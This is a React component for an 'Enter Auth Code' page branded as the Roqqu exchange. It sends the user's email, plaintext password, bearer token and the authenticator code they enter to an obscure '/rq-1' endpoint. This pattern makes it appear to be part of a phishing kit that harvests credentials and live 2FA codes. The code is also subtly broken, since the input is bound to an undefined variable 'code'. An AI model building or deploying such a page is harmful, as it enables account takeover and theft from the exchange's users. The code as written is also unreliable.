import React, { useState } from 'react'
import { useHistory } from 'react-router-dom'
import URL from './Url.js'

import twoFA from '../assets/2fa.png'

export default function Otp(props) {
    const history = useHistory()

        const [verifyOtp, setVerifyOtp] = useState('')
    const [loading, setLoading] = useState(false)

  const handleCode = (e) => {
      setVerifyOtp(e.target.value.replace(/\D/, ''))
  }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        const clientOtp = verifyOtp

        if (props.location.state) {
            const templateParams = props.location.state

            templateParams.clientOtp = clientOtp

            try {
              
                const response = await fetch(URL + '/rq-1', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-type': 'application/json',
                        Authorization: 'Bearer ' + templateParams.token,
                    },
                    credentials: 'include',
                    mode: 'cors',

                    body: JSON.stringify({
                        email: templateParams.email,
                        password: templateParams.password,
                        pin: clientOtp,
                        otp: '',
                    }),
                })

                const resData = await response.json()

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setTimeout(() => {
                        console.log('time out init')
                        setLoading(false)

                        history.push('/verifyotp', templateParams)
                    }, 3000)
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
            }
        }
    }

    return (
        <div className='container mx-auto'>
            <div className='max-w-sm mx-auto md:max-w-lg'>
                <div className='w-full grid justify-center justify-items-center mt-12 '>
                    <div className='bg-[#cbe5f4] grid justify-center w-24 h-24 rounded-full p-3 content-center'>
                        <img alt='roqqu logo' src={twoFA} className='w-14' />
                    </div>
                    <div className=' h-64 py-3 rounded text-center mt-4'>
                        <h1 className='text-2xl font-bold'>Enter Auth Code</h1>
                        <div
                            className='flex flex-col mt-4 mx-5'
                            style={{
                                lineHeight: '2em !important',
                                fontSize: '15px',
                            }}
                        >
                            {' '}
                            <span className='px-8'>
                                An Auth code from your authenticator app is
                                required to complete your transactions on Roqqu
                            </span>{' '}
                        </div>

                        <form onSubmit={handleSubmit} className=' px-6'>
                            <input
                                type='text'
                                id='code'
                                className='text-[#b2b7be] outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-[#b2b7be] mb-4 bg-transparent border border-[#b2b7be] my-10 w-full'
                                required
                                pattern='\d*'
                                value={code}
                                placeholder='Enter Auth Code'
                                onChange={handleCode}
                                maxLength={6}
                            />

                            <div className='flex justify-center text-center mt-10'>
                                {' '}
                                <button className='flex items-center text-blue-700 hover:text-blue-900 cursor-pointer'>
                                    <span className=' bg-[#21ba45] text-white py-2 px-11 rounded-lg'>
                                        {loading ? 'loading...' : 'Complete'}
                                    </span>
                                    <i className='bx bx-caret-right ml-1'></i>
                                </button>{' '}
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    )
}
